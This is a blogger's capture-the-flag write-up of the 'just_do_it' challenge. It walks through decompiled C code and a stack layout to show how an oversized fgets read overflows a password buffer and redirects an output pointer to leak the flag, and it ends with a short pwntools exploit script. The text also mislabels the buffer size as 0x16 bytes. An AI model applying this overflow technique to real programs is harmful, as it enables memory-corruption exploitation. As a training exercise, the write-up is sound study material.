At first this challenge seemed a lot harder than the last few ones for me to understand, but after some research I found out I was just greatly overcomplicating things. The bad part about knowing multiple languages on a surface level and not deepening our knowledge in some of them is that sometimes we just think something is way harder than it is for no other reason than thinking that `x` language functions the same as `y` language.

For example, in the last years I mostly worked with`Javascript/Typescript `and some ``Python`` as my main languages, so when coming back to ``C (and affiliates)``, I seem to always forget that functions don't usually return the data that I expect, only if it was successful or not :P. So when looking at all the `fgets` and assuming that the flag was being read and then overwritten, by our input instead of understanding that the flag was being saved in the first parameter specified in `fgets` really made this a lot harder than it needed to be for me.

```
undefined4 main(void)

{
  char *input;
  int iVar1;
  char vulnerableBuffer [16];
  FILE *flagFile;
  char *output;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  output = "Invalid Password, Try Again!";
  flagFile = fopen("flag.txt","r");
  if (flagFile == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  input = fgets(flag,0x30,flagFile);
  if (input == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  input = fgets(vulnerableBuffer,0x20,stdin);
  if (input == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = strcmp(vulnerableBuffer,"P@SSW0RD");
  if (iVar1 == 0) {
    output = "Correct Password, Welcome!";
  }
  puts(output);
  return 0;
}
```

After a while, and after reading the official Nightmare writeup and still being confused after my mistake, I realized  what I was doing wrong and was able to solve by myself.

The program starts off by reading the flag into memory, and then asks us if we know the correct password, and prints some output to us. (as we can see above, the password is hardcoded so that part is no sweat in our end). The bug we're exploiting here lies in the `fgets` that is supposed to read our password. Whilst our password buffer is only `0x16` bytes, the `fgets` lets us write `0x20` into it, letting us overflow into other variables. 

```
undefined main(undefined1 param_1)
	undefined         AL:1           <RETURN>
	undefined1        Stack[0x4]:1   param_1
	undefined4        EAX:4          input
	undefined4        Stack[0x0]:4   local_res0
	undefined4        Stack[-0xc]:4  local_c
	undefined4        Stack[-0x14]:4 output
	undefined4        Stack[-0x18]:4 flagFile
	undefined1[16]    Stack[-0x28]   vulnerableBuffer
```

As we can see from the stack layout, se can get into the `output` variable with this overflow (`0x28 - 0x14 = 0x14` and `0x20 > 0x14`), so we can just point the output variable, which is a `char *` into the address in which flag was written to in memory, therefore leaking the flag instead of receiving our congratulations for our correct password :D! 

So writing this logic up in a little python script we get:

```
from pwn import *

elf = process('./just_do_it')
context.log_level = "DEBUG"

payload = b"A" * 0x14 + p32(0x0804a080)

elf.sendline(payload)
```